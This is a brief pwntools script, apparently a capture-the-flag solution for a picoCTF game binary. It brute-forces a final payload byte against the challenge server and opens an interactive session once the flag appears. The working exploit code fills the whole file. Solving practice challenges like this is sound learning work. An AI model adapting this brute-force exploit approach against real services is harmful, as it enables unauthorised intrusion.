from pwn import *
host = "saturn.picoctf.net"
port = 64372
exe = "./game"
binary = context.binary = ELF(exe,checksec=False)
def conn():
    if args.LOCAL:
        return process(exe)
    else :
        return remote(host,port)
def main():

    for i in range(255) :
        p = conn() 
        last_byte = bytes([i])
        payload = flat (b"w"*4 , b"a"*7,last_byte)
        p.sendline(payload)
        l= p.recv(timeout=1)
        if b"picoCTF" in  l :
            p.interactive()
            print(l)
            break  
        p.close()
    

if __name__=="__main__":
    main()
